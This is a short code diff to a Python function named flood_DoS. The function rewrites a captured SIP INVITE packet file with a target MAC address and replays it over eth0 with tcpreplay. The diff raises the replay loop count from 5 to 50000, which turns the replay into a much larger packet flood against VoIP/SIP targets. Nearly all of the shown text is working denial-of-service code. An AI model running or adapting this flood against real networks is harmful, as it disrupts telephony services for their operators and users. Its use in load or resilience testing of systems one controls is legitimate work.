@@ -22,7 +22,7 @@ def flood_DoS(id, IP, MAC):
  '--enet-dmac='+MAC,'--dlt=enet','--fixcsum', '--infile=sipInvite.pcap',
  '--outfile=newSipInvite'+id+'.pcap'])
  
- subprocess.Popen(['tcpreplay', '--intf1=eth0', '--loop=5',
+ subprocess.Popen(['tcpreplay', '--intf1=eth0', '--loop=50000',
  'newSipInvite'+id+'.pcap'])
 return 
 
